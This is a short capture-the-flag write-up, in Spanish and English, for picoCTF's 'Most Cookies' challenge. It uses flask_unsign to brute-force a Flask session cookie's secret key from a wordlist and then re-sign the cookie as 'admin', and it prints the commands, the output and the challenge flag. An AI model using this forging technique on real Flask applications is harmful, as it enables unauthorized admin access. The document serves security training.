# Most Cookies

## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

http://wily-courier.picoctf.net:64093/

## Solución

```
mackbookair@victor-2 ~ % python3 -m flask_unsign --unsign \
--cookie "eyJ2ZXJ5X2F1dGgiOiJnaW5nZXJicmVhZCJ9.aajoXw.In45tSZ6cmD-XFKvuYu_5ckhXaE" \
--wordlist galletas.txt
/Users/a/Library/Python/3.9/lib/python/site-packages/urllib3/__init__.py:35: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with 'LibreSSL 2.8.3'. See: https://github.com/urllib3/urllib3/issues/3020
  warnings.warn(
[*] Session decodes to: {'very_auth': 'gingerbread'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'crinkle'
mackbookair@victor-2 ~ % python3 -m flask_unsign --sign \
--cookie "{'very_auth': 'admin'}" \
--secret 'crinkle'
/Users/a/Library/Python/3.9/lib/python/site-packages/urllib3/__init__.py:35: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with 'LibreSSL 2.8.3'. See: https://github.com/urllib3/urllib3/issues/3020
  warnings.warn(
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aajpkQ.jF-YuZUEpDEk2XZTlGfXZYFaUwQ
```

FLAG:
picoCTF{cO0ki3s_yum_7ff5bad5}

## Notas adicionales
- Hacemos uso de flag-unsign para poder conseguir la palabra clave de una cookie y así cambiarla para obtener la flag.

## Referencias
- https://github.com/Paradoxis/Flask-Unsign